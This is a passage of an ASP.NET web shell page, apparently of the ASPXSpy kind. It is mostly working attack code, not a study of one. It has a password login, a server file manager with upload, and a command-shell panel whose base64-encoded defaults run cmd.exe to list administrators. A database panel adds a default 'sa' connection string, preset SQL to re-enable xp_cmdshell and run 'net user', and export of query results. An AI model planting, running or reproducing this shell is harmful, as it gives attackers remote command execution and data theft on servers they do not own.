    protected void B_B_Conn_Click(object sender, EventArgs e)
    {
        B_Newconn();
    }
    protected void B_B_Query_Click(object sender, EventArgs e)
    {
        B_B_Export.Visible = true;
        B_ExecBind();
    }
    protected void B_B_Export_Click(object sender, EventArgs e)
    {
        try
        {
            OpenConnection();
            if (B_List_Connstr.SelectedItem.Text == "MSSQL")
            {
                if (B_List_DB.SelectedItem.Value != "")
                {
                    conn.ChangeDatabase(B_List_DB.SelectedItem.Value.ToString());
                }
            }
            DataTable dt = B_DataTable(B_Textarea_Query.InnerText);
            string fname = "Query.xls";
            Match mat = Regex.Match(B_Textarea_Query.InnerText, @"(?<= from \[?)[\w.]+");
            if (mat.Success)
            {
                fname = mat.Value + ".xls";
            }
            if (dt.Columns.Count > 0)
            {
                Response.AddHeader("Content-Disposition", "attachment;filename=" + fname);
                Response.ContentType = "application/ms-excel";
                {
                    Response.Write("<table border=1><tr>\r\n");
                    foreach (DataColumn subcol in dt.Columns)
                    {
                        Response.Write("<td><b>" + subcol.ColumnName + "</b></td>");
                    }
                    Response.Write("</tr>");
                    foreach (DataRow subrow in dt.Rows)
                    {
                        Response.Write("<tr>");
                        for (int i = 0; i < subrow.ItemArray.Length; i++)
                        {
                            Response.Write("<td>" + subrow.ItemArray[i].ToString() + "</td>");
                        }
                        Response.Write("</tr>");
                    }
                    Response.Write("</table>\r\n");
                }
                Response.End();
            }
            else { B_Msg("No data!"); }
        }
        catch (Exception ex) { zcg_ShowError(ex); }
    }

</script>
<html xmlns="http://www.w3.org/1999/xhtml">
<head id="Head1" runat="server">
    <meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
    <title><%=Version + " - " +Request.ServerVariables["SERVER_NAME"]%></title>
    <style type="text/css">
        .B_Style_Login {
            font: 11px Verdana;
            BACKGROUND: #FFFFFF;
            border: 1px solid #666666;
        }

        body, td {
            font: 15px Arial,Tahoma;
            line-height: 16px;
        }

        .input {
            font: 15px Arial,Tahoma;
            background: #fff;
            border: 1px solid #666;
            padding: 2px;
            height: 16px;
        }

        .list {
            font: 15px Arial,Tahoma;
            height: 20px;
        }

        .area {
            font: 15px 'Courier New',Monospace;
            background: #fff;
            border: 1px solid #666;
            padding: 2px;
        }

        .bt {
            border-color: #b0b0b0;
            background: #3d3d3d;
            color: #ffffff;
            font: 15px Arial,Tahoma;
        }

        a {
            color: #00f;
            text-decoration: underline;
        }

            a:hover {
                color: #f00;
                text-decoration: none;
            }

        .alt1 td {
            border-top: 1px solid #fff;
            border-bottom: 1px solid #ddd;
            background: #EEEEEE;
            padding: 5px 10px 5px 5px;
        }

        .alt2 td {
            border-top: 1px solid #fff;
            border-bottom: 1px solid #ddd;
            background: #fafafa;
            padding: 5px 10px 5px 5px;
        }

        .focus td {
            border-top: 1px solid #fff;
            border-bottom: 1px solid #ddd;
            background: #D0E4F5;
            padding: 5px 10px 5px 5px;
        }

        .head td {
            border-top: 1px solid #ddd;
            border-bottom: 1px solid #ccc;
            background: #35a0dd;
            padding: 5px 10px 5px 5px;
            font-weight: bold;
        }

            .head td span {
                font-weight: normal;
            }

        form {
            margin: 0;
            padding: 0;
        }

        h2 {
            margin: 0;
            padding: 0;
            height: 24px;
            line-height: 24px;
            font-size: 14px;
            color: #5B686F;
        }

        ul.info li {
            margin: 0;
            color: #444;
            line-height: 24px;
            height: 24px;
        }

        u {
            text-decoration: none;
            color: #777;
            float: left;
            display: block;
            width: 150px;
            margin-right: 10px;
        }

        .u1 {
            text-decoration: none;
            color: #777;
            float: left;
            display: block;
            width: 150px;
            margin-right: 10px;
        }

        .u2 {
            text-decoration: none;
            color: #777;
            float: left;
            display: block;
            width: 350px;
            margin-right: 10px;
        }
    </style>
    <script type="text/javascript">
        function CheckAll(form) {
            for (var i = 0; i < form.elements.length; i++) {
                var e = form.elements[i];
                if (e.name != 'chkall')
                    e.checked = form.chkall.checked;
            }
        }
    </script>
</head>
<body style="margin: 0; table-layout: fixed;">
    <form id="ASPX" runat="server">
        <div id="B_D_Login" runat="server" style="margin: 15px" enableviewstate="false" visible="false">
            <span style="font: 11px Verdana;">Password:</span>
            <asp:TextBox TextMode="Password" ID="B_TB_Login" runat="server" CssClass="B_Style_Login"></asp:TextBox>
            <asp:Button ID="B_B_Login" runat="server" Text="Login" CssClass="B_Style_Login" OnClick="B_B_Login_Click" />
        </div>
        <div id="B_D_Content" runat="server">
            <div id="B_D_Head" runat="server">
                <table width="100%" border="0" cellpadding="0" cellspacing="0">
                    <tr class="head">
                        <td><span style="float: right;"></span><span id="B_Span_Sname" runat="server" enableviewstate="true"></span></td>
                    </tr>
                    <tr class="alt1">
                        <td><span style="float: right;" id="B_Span_FrameVersion" runat="server"></span>
                            <asp:LinkButton ID="B_B_Logout" runat="server" OnClick="B_B_Logout_Click" Text="Logout"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="B_B_File" runat="server" Text="File Manager" OnClick="B_B_File_Click"></asp:LinkButton>
                            |
                            <asp:LinkButton ID="B_B_Cmd" runat="server" Text="CmdShell" OnClick="B_B_Cmd_Click" ></asp:LinkButton>
                            |
                            <asp:LinkButton ID="B_B_DB" runat="server" Text="DataB" OnClick="B_B_DB_Click"></asp:LinkButton>
                    </tr>
                </table>
            </div>
            <table width="100%" border="0" cellpadding="15" cellspacing="0">
                <tr>
                    <td>
                        <div id="B_D_Msg" style="background: #f1f1f1; border: 1px solid #ddd; padding: 15px; font: 14px; text-align: center; font-weight: bold;" runat="server" visible="false" enableviewstate="false"></div>
                        <h2 id="B_H2_Title" runat="server"></h2>
                        <%--FileList--%>
                        <div id="B_D_File" runat="server">
                            <table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin: 10px 0;">
                                <tr>
                                    <td style="white-space: nowrap">Current Directory : </td>
                                    <td style="width: 100%">
                                        <input class="input" id="B_TB_Path" type="text" style="width: 97%; margin: 0 8px;" runat="server" />
                                    </td>
                                    <td style="white-space: nowrap">
                                        <asp:Button ID="B_B_Go" runat="server" Text="Go" CssClass="bt" OnClick="B_B_Go_Click" /></td>
                                </tr>
                            </table>

                            <table width="100%" border="0" cellpadding="4" cellspacing="0">
                                <tr class="alt1">
                                    <td style="padding: 5px;">
                                        <div style="float: right;">
                                            <input id="B_Lable_File" class="input" runat="server" type="file" style="height: 22px" />
                                            <asp:Button ID="B_B_Upload" CssClass="bt" runat="server" Text="Upload" OnClick="B_B_Upload_Click" />
                                        </div>
                                        <asp:LinkButton ID="B_B_WebRoot" runat="server" Text="WebRoot" OnClick="B_B_WebRoot_Click"></asp:LinkButton>
                                        | <span id="B_Span_Drv" runat="server"></span><a href="#" id="B_bkme" runat="server" style="color: Red">Kill Me</a>
                                    </td>
                                </tr>
                                <asp:Table ID="B_Table_File" runat="server" Width="100%" CellSpacing="0">
                                    <asp:TableRow CssClass="head">
                                        <asp:TableCell>&nbsp;</asp:TableCell><asp:TableCell>Filename</asp:TableCell><asp:TableCell Width="25%">Last modified</asp:TableCell><asp:TableCell Width="15%">Size</asp:TableCell><asp:TableCell Width="25%">Action</asp:TableCell>
                                    </asp:TableRow>
                                </asp:Table>
                            </table>
                        </div>
                        <%--CmdShell--%>
                        <div runat="server" id="B_D_Cmd">
                            <p>
                                CmdPath:<br />
                                <input class="input" runat="server" id="B_TB_CmdPath" type="text" size="100" value="QzpcV2luZG93c1xTeXN0ZW0zMlxjbWQuZXhl" />
                            </p>
                            Argument:<br />
                            <input type="checkbox" runat="server" id="cmd_download_result" value="1" />
                            Download Result
                            <br />
                            <input class="input" runat="server" id="B_TB_CmdArg" value="L2MgbmV0IGxvY2FsZ3JvdXAgYWRtaW5pc3RyYXRvcnM=" type="text" size="100" />
                            <asp:Button ID="B_B_CmdExec" CssClass="bt" runat="server" Text="Submit" OnClick="B_B_CmdExec_Click" OnClientClick="base64_encode()" />

                            <div id="B_D_CmdRes" runat="server" visible="false" enableviewstate="false">
                            </div>
                        </div>
                        <%--DataB--%>
                        <div id="B_D_Data" runat="server">
                            <div id='zcg_divresize' style="width: 1000px; overflow: auto">
                                <p>
                                    ConnString :
                                    <asp:TextBox ID="B_TB_ConnStr" Style="width: 70%; margin: 0 8px; height: 17px" CssClass="input" runat="server" />
                                    <asp:DropDownList runat="server" CssClass="list" ID="B_List_Connstr" AutoPostBack="True" OnSelectedIndexChanged="B_List_SelectedIndexChanged">
                                        <asp:ListItem></asp:ListItem>
                                        <asp:ListItem Value="server=localhost,1433;UID=sa;PWD=sa;database=master">MSSQL</asp:ListItem>
                                    </asp:DropDownList><asp:Button ID="B_B_Conn" runat="server" Text="Go" CssClass="bt" OnClick="B_B_Conn_Click" />
                                </p>

                            </div>
                            <div id="B_D_DBPanel" runat="server">
                                <div id="B_D_Dbinfo" runat="server"></div>
                                <div id="B_D_Dblist" runat="server">
                                    select a database :
                                    <asp:DropDownList runat="server" ID="B_List_DB" AutoPostBack="True" OnSelectedIndexChanged="B_List_SelectedIndexChanged" CssClass="list"></asp:DropDownList>
                                    SQLExec :
                                    <asp:DropDownList runat="server" ID="B_List_Exec" AutoPostBack="True" OnSelectedIndexChanged="B_List_SelectedIndexChanged" CssClass="list">
                                        <asp:ListItem Value="">-- SQL Server Exec --</asp:ListItem>
                                        <asp:ListItem Value="Use master dbcc addextendedproc('xp_cmdshell','xplog70.dll')">Add XP</asp:ListItem>
                                        <asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;">Add XP(SQL2005)</asp:ListItem>
                                        <asp:ListItem Value="Exec sp_configure 'show advanced options',1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;">Add openrowset/opendatasource(SQL2005)</asp:ListItem>
                                        <asp:ListItem Value="Exec master.dbo.xp_cmdshell 'net user'">XP_cmdshell exec</asp:ListItem>
                                    </asp:DropDownList>
                                    <asp:Button runat="server" ID="B_B_Show" CssClass="bt" Text="Show Tables" OnClick="B_List_SelectedIndexChanged" />
                                </div>
                                <table width="100%" border="0" cellpadding="0" cellspacing="0">
                                    <tr>
                                        <td>Run SQL </td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <textarea id="B_Textarea_Query" class="area" style="overflow: auto;" runat="server" rows="5" cols="100"></textarea></td>
                                    </tr>
                                    <tr>
                                        <td>
                                            <asp:Button runat="server" ID="B_B_Query" CssClass="bt" Text="Query" OnClick="B_B_Query_Click" />
                                            <asp:Button runat="server" ID="B_B_Export" CssClass="bt" Text="Export" OnClick="B_B_Export_Click" Visible="false" EnableViewState="false" />
                                        </td>
                                    </tr>
                                </table>

                                <div style="overflow: auto;">
                                    <p>
                                        <asp:DataGrid runat="server" ID="B_DataGrid" HeaderStyle-CssClass="head" BorderWidth="0" GridLines="None" EnableViewState="false"></asp:DataGrid>
                                    </p>
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
            </table>
        </div>
    </form>
</body>
</html>

